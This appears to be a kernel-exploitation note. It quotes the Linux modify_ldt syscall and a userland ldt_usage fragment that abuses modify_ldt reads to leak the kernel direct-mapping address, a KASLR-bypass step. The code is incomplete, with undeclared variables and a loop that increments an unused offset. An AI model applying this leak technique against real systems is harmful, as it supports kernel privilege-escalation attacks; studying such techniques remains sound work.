/*
 * ldt
 */
struct ldt_struct {
  struct desc_struct *entries;
  unsigned int nr_entries;
  int slot;
};

SYSCALL_DEFINE3(modify_ldt, int, func, void __user *, ptr, unsigned long,
                bytecount) {
  int ret = -ENOSYS;

  switch (func) {
    case 0:
      ret = read_ldt(ptr, bytecount);
      break;
    case 1:
      ret = write_ldt(ptr, bytecount, 1);
      break;
    case 2:
      ret = read_default_ldt(ptr, bytecount);
      break;
    case 0x11:
      ret = write_ldt(ptr, bytecount, 0);
      break;
  }
  /*
   * The SYSCALL_DEFINE() macros give us an 'unsigned long'
   * return type, but tht ABI for sys_modify_ldt() expects
   * 'int'.  This cast gives us an int-sized value in %rax
   * for the return code.  The 'unsigned' is necessary so
   * the compiler does not try to sign-extend the negative
   * return codes into the high half of the register when
   * taking the value from int->long.
   */
  return (unsigned int)ret;
}

void ldt_usage() {
  struct user_desc desc;

  /* init descriptor info in direct mapping area*/
  desc.base_addr = 0xff0000;
  desc.entry_number = 0x8000 / 8;
  desc.limit = 0;
  desc.seg_32bit = 0;
  desc.contents = 0;
  desc.limit_in_pages = 0;
  desc.lm = 0;
  desc.read_exec_only = 0;
  desc.seg_not_present = 0;
  desc.useable = 0;

  syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));  // change ldt

  /* leak kernel direct mapping area by modify_ldt() */
  while (1) {
    retval = syscall(SYS_modify_ldt, 0, &temp, 8);
    if (retval > 0) {
      printf("[-] read data: %llx\n", temp);
      break;
    } else if (retval == 0) {
      log_error("no mm->context.ldt!");
    }
    page_offset_base += 0x1000000;
  }
}